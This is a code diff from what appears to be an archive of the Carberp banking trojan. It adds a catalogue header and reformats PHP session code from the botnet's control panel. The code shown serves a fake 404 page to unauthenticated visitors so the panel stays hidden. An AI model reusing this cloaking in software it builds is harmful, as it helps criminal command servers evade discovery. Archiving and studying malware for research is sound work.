@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     —
+ */
 <?php
 
 setlocale(LC_ALL,"ru_RU.UTF-8");
@@ -94,9 +105,12 @@ session_start();
 
 $smarty->assignByRef("_SESSION", $_SESSION);
 
-if(isset($_SESSION['user']->PHPSESSID)){	if(empty($Cur['to'])) $Cur['to'] = 'main';
+if(isset($_SESSION['user']->PHPSESSID)){
+	if(empty($Cur['to'])) $Cur['to'] = 'main';
 	if(empty($Cur['go'])) $Cur['go'] = 'info';
-}else{    if($Cur['to'] != 'accounts' && $Cur['to'] != 'accounts'){    	header("HTTP/1.1 404 Not Found");
+}else{
+    if($Cur['to'] != 'accounts' && $Cur['to'] != 'accounts'){
+    	header("HTTP/1.1 404 Not Found");
     	header("Status: 404 Not Found");
     	print(file_get_contents('404.html'));
     	exit;
@@ -113,9 +127,12 @@ if(!isset($_SESSION['user']->PHPSESSID) || $_SESSION['user']->PHPSESSID != $_COO
 
 	$_SESSION['user']->access['accounts']['authorization'] = 'on';
 	$_SESSION['user']->access['accounts']['exit'] = 'on';
-}else{	if(!empty($_SESSION['user']->config['lang'])){		$config['lang'] = $_SESSION['user']->config['lang'];
+}else{
+	if(!empty($_SESSION['user']->config['lang'])){
+		$config['lang'] = $_SESSION['user']->config['lang'];
 		language($_SESSION['user']->config['lang']);
-	}else{		language($config['lang']);
+	}else{
+		language($config['lang']);
 	}
 }
 
